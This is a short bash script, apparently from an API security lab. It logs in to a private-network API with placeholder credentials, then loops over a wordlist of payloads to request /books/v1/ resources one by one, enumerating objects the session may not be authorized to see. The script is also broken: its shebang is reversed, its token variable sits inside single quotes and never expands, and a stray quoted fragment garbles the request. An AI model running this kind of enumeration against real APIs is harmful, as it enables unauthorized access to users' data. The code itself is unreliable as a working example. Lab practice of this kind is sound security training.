!#/bin/bash

sessionid=$(curl -s -X POST -H 'Content-Type: application/json' -d '{"username":"name1","password":"pass1"}' "http://192.168.100.45:5000/users/v1/login" --insecure | cut -d , -f 1 | cut -d \" -f 4)

cat ~/API_Sec_Lab/IntruderPayloads/books.txt | while read line; do curl -s -X GET -H 'Connection: close' -H 'Authorization: bearer $sessionid', "message' --insecure "http://<HOST>:<PORT>/books/v1/$(echo $line|tr -d '\n\t\r')" -w '\n'; done